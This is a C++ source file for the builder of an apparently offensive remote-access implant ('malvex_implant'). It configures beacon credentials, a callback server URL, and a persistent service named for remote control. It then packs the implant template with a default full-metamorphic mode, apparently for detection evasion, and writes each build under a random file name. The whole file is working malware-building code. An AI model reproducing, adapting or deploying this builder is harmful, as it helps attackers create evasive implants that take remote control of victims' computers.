#include "Builder.hpp"
#include "Config.hpp"
#include "LogManager.hpp"
#include "Packer/ImplantPacker.hpp"
#include "Types.hpp"
#include <ImplantConfig.hpp>
#include <Metamorphic/PackMode.hpp>
#include <UrlUtils.hpp>

#include <cstring>
#include <filesystem>

Builder& Builder::instance(const std::string& db_path) {
    static Builder instance(db_path);
    return instance;
}

Builder::Builder(const std::string& db_path)
    : m_conf(Config::instance(db_path)),
      m_log_man(LogManager::instance()) {
    syncConfigFromStorage();
}

void Builder::syncConfigFromStorage() {
    setUsername(getUsername());
    setPassword(getPassword());
    setTimeout(getTimeout());
    setServerURL(getServerURL());
    setServiceName(getServiceName());
    setServiceDesc(getServiceDesc());
    setPackMode(getPackMode());
}

std::string Builder::getUsername() const noexcept {
    return m_conf.get<std::string>("implant_username", "vicky");
}

std::string Builder::getPassword() const noexcept {
    return m_conf.get<std::string>("implant_password", "victim");
}

std::string Builder::getServerURL() const noexcept {
    const auto default_url = make_victim_beacon_url("https://127.0.0.1", getVictimApiPort());
    return m_conf.get<std::string>(Key::client_implant_url_key, default_url);
}

uint16_t Builder::getVictimApiPort() const noexcept {
    return static_cast<uint16_t>(m_conf.get<int>(Key::client_victim_api_port_key, 3000));
}

std::string Builder::getTimeout() const noexcept {
    return m_conf.get<std::string>("implant_timeout", "5");
}

std::string Builder::getOutputDir() const noexcept {
    return m_conf.get<std::string>("implant_output_dir", "./outputs");
}

std::string Builder::getServiceDesc() const noexcept {
    return m_conf.get<std::string>("implant_service_desc", "Service allowing remote control");
}

std::string Builder::getServiceName() const noexcept {
    return m_conf.get<std::string>("implant_service_name", "malvex_implant");
}

metamorphic::PackMode Builder::getPackMode() const noexcept {
    const auto index = m_conf.get<int>("implant_pack_mode", metamorphic::pack_mode_to_index(metamorphic::PackMode::FullMetamorphic));
    return metamorphic::pack_mode_from_index(index);
}

int Builder::getPackModeIndex() const noexcept {
    return metamorphic::pack_mode_to_index(getPackMode());
}

void Builder::setPackMode(metamorphic::PackMode mode) {
    m_conf.set("implant_pack_mode", metamorphic::pack_mode_to_index(mode));
}

void Builder::setPackModeIndex(int index) {
    setPackMode(metamorphic::pack_mode_from_index(index));
}

void Builder::setUsername(const std::string& username) {
    std::strncpy(m_config.username, username.c_str(), std::size(m_config.username) - 1);
    m_config.username[sizeof(m_config.username) - 1] = '\0';
    m_conf.set("implant_username", username);
}

void Builder::setPassword(const std::string& password) {
    std::strncpy(m_config.password, password.c_str(), std::size(m_config.password) - 1);
    m_config.password[sizeof(m_config.password) - 1] = '\0';
    m_conf.set("implant_password", password);
}

void Builder::setOutputDir(const std::string& output_dir) {
    m_conf.set("implant_output_dir", output_dir);
}

void Builder::setTimeout(const std::string& timeout) {
    std::strncpy(m_config.default_timeout, timeout.c_str(), std::size(m_config.default_timeout) - 1);
    m_config.default_timeout[sizeof(m_config.default_timeout) - 1] = '\0';
    m_conf.set("implant_timeout", timeout);
}

void Builder::setServerURL(const std::string& server_url) {
    auto normalized_url = strip_trailing_slash(server_url);
    if (normalized_url.empty()) {
        normalized_url = make_victim_beacon_url("https://127.0.0.1", getVictimApiPort());
    } else if (!url_has_explicit_port(normalized_url)) {
        normalized_url = make_victim_beacon_url(normalized_url, getVictimApiPort());
    }

    std::strncpy(m_config.server_url, normalized_url.c_str(), std::size(m_config.server_url) - 1);
    m_config.server_url[sizeof(m_config.server_url) - 1] = '\0';
    m_conf.set(Key::client_implant_url_key, normalized_url, true);
}

void Builder::setServiceName(const std::string& service_name) {
    std::strncpy(m_config.service_name, service_name.c_str(), std::size(m_config.service_name) - 1);
    m_config.service_name[sizeof(m_config.service_name) - 1] = '\0';
    m_conf.set("implant_service_name", service_name);
}

void Builder::setServiceDesc(const std::string& service_description) {
    std::strncpy(m_config.service_desc, service_description.c_str(), std::size(m_config.service_desc) - 1);
    m_config.service_desc[sizeof(m_config.service_desc) - 1] = '\0';
    m_conf.set("implant_service_desc", service_description);
}

bool Builder::buildImplant() {
    auto& log = m_log_man;

    const std::filesystem::path input_file("implant");
    if (!std::filesystem::exists(input_file)) {
        log.local_log("Builder Error: failed to find implant template!");
        return false;
    }

    std::filesystem::path output_dir = getOutputDir();
    std::filesystem::create_directories(output_dir);

    const auto output_file = output_dir / std::format("implant_{}", generate_nonce());

    syncConfigFromStorage();

    ImplantConfig new_config{};
    std::strncpy(new_config.username, getUsername().c_str(), sizeof(new_config.username) - 1);
    std::strncpy(new_config.password, getPassword().c_str(), sizeof(new_config.password) - 1);
    std::strncpy(new_config.default_timeout, getTimeout().c_str(), sizeof(new_config.default_timeout) - 1);
    std::strncpy(new_config.server_url, getServerURL().c_str(), sizeof(new_config.server_url) - 1);
    std::strncpy(new_config.service_name, getServiceName().c_str(), sizeof(new_config.service_name) - 1);
    std::strncpy(new_config.service_desc, getServiceDesc().c_str(), sizeof(new_config.service_desc) - 1);

    const auto pack_result = ImplantPacker::pack(getPackMode(), input_file, output_file, new_config);
    if (!pack_result.success) {
        log.local_log(std::format("Builder Error: {}", pack_result.error));
        return false;
    }

    log.local_log(std::format(
        "Builder: Saved {} implant: {}",
        metamorphic::pack_mode_name(getPackMode()),
        pack_result.output_path));
    return true;
}
